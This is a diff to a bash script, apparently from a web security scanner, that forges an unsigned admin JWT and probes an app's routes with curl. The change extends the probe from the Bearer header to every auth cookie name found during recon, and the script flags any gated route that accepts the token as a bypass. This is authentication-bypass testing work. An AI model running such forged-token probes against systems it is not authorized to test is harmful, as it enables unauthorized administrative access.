@@ -26,6 +26,16 @@ def b(o): return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b'=').d
 print(b({'alg':'RS256','typ':'JWT','kid':'forged'})+'.'+b({'sub':'websec-forged','email':'websec-forged@example.com','role':'admin','roles':['admin'],'exp':9999999999})+'.d2Vic2VjLWZvcmdlZC1zaWc')
 ")
 
+# Auth cookie names the app reads (from recon → probe-context.json) + an optional COOKIE_NAME
+# override. We forge into these too, not just Authorization: Bearer, so a cookie-ONLY app isn't
+# a false negative. (portable; macOS bash 3.2 lacks `mapfile`.)
+COOKIES=()
+[ -n "${COOKIE_NAME:-}" ] && COOKIES+=("$COOKIE_NAME")
+while IFS= read -r cn; do [ -n "$cn" ] && COOKIES+=("$cn"); done < <(python3 -c "
+import json
+for c in json.load(open('$ctx')).get('auth',{}).get('cookie_names',[]): print(c)
+" 2>/dev/null)
+
 # Routes to test: GET reads + GET idor/ssrf candidates (always); writes when PROBE_WRITES=1.
 # Skip any path with an unfilled {param}. (portable; macOS bash 3.2 lacks `mapfile`.)
 ROUTES=()
@@ -64,9 +74,11 @@ for ep in "${ROUTES[@]}"; do
   if [ "$na" != "401" ] && [ "$na" != "403" ]; then skip=$((skip+1)); continue; fi   # not gated unauthenticated → N/A here
   fg=$(curl -s -o /dev/null -w '%{http_code}' -X "$method" "$BASE$path" -H "Authorization: Bearer $FORGED" ${data[@]+"${data[@]}"} --max-time 15)
   via="Bearer"
-  if ! reached "$fg" && [ -n "${COOKIE_NAME:-}" ]; then
-    fg=$(curl -s -o /dev/null -w '%{http_code}' -X "$method" "$BASE$path" -H "Cookie: $COOKIE_NAME=$FORGED" ${data[@]+"${data[@]}"} --max-time 15)
-    via="cookie:$COOKIE_NAME"
+  if ! reached "$fg"; then   # Bearer didn't reach the handler → try forging into each known auth cookie
+    for cn in ${COOKIES[@]+"${COOKIES[@]}"}; do
+      cfg=$(curl -s -o /dev/null -w '%{http_code}' -X "$method" "$BASE$path" -H "Cookie: $cn=$FORGED" ${data[@]+"${data[@]}"} --max-time 15)
+      if reached "$cfg"; then fg="$cfg"; via="cookie:$cn"; break; fi
+    done
   fi
   if reached "$fg"; then
     printf '  BYPASS  %s→%s  %s %s   (forged token accepted via %s)\n' "$na" "$fg" "$method" "$path" "$via"; bypass=$((bypass+1))
